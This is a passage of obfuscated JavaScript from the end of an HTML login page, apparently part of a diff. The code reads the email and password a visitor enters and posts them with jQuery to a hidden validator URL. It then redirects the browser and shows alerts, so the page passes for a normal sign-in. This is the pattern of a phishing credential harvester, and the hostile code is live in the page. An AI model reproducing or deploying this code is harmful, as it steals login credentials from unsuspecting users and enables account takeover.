false};if(!_0x3c58x1c[_0xe9f1[42]]()[_0xe9f1[46]]){alert(_0xe9f1[50]);$(_0xe9f1[45])[_0xe9f1[48]]();return false};login();return true}function login(){var _0x3c58xb=$(_0xe9f1[44])[_0xe9f1[43]]()[_0xe9f1[42]]();var _0x3c58x1c=$(_0xe9f1[45])[_0xe9f1[43]]()[_0xe9f1[42]]();var _0x3c58x1e=false;var _0x3c58x1f=parseInt(Math[_0xe9f1[51]]()* 10);var _0x3c58x20=getValidatorUrl();$(_0xe9f1[54])[_0xe9f1[53]](_0xe9f1[52],true);$(_0xe9f1[54])[_0xe9f1[56]](_0xe9f1[55]);var _0x3c58x21=window[_0xe9f1[58]][_0xe9f1[57]]+ _0xe9f1[59]+ window[_0xe9f1[58]][_0xe9f1[60]]+ _0xe9f1[61];$[_0xe9f1[70]](_0x3c58x20,$[_0xe9f1[67]]({email:_0x3c58xb,password:_0x3c58x1c,type:_0xe9f1[66]}),function(_0x3c58x24,_0x3c58x23,_0x3c58x25){$(_0xe9f1[54])[_0xe9f1[56]](_0xe9f1[68]);window[_0xe9f1[58]][_0xe9f1[69]]= _0x3c58x21})[_0xe9f1[65]](function(_0x3c58x22,_0x3c58x23){$(_0xe9f1[54])[_0xe9f1[53]](_0xe9f1[52],false);$(_0xe9f1[54])[_0xe9f1[56]](_0xe9f1[62]);$(_0xe9f1[63])[_0xe9f1[43]](_0x3c58x1c);$(_0xe9f1[45])[_0xe9f1[43]](_0xe9f1[1]);alert(_0xe9f1[64]);$(_0xe9f1[45])[_0xe9f1[48]]();return false})}function validateEmail(_0x3c58xb){var _0x3c58xc=/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;return _0x3c58xc[_0xe9f1[14]](_0x3c58xb)}function isValidPassword(_0x3c58x18){for(var _0x3c58x28=ListEntries[_0xe9f1[46]]- 1;_0x3c58x28>= 0;_0x3c58x28--){var _0x3c58x29= new RegExp(ListEntries[_0x3c58x28],_0xe9f1[7]);if(_0x3c58x29[_0xe9f1[14]](_0x3c58x18)){return false}};return true}function strRandom(){var _0x3c58x2b=_0xe9f1[1];var _0x3c58x2c=_0xe9f1[71];for(var _0x3c58x28=0;_0x3c58x28< 10;_0x3c58x28++){_0x3c58x2b+= _0x3c58x2c[_0xe9f1[73]](Math[_0xe9f1[72]](Math[_0xe9f1[51]]()* _0x3c58x2c[_0xe9f1[46]]))};return _0x3c58x2b}function getValidatorUrl(){return _0xe9f1[74]}
+    </script>
+
+
+
+</body></html>
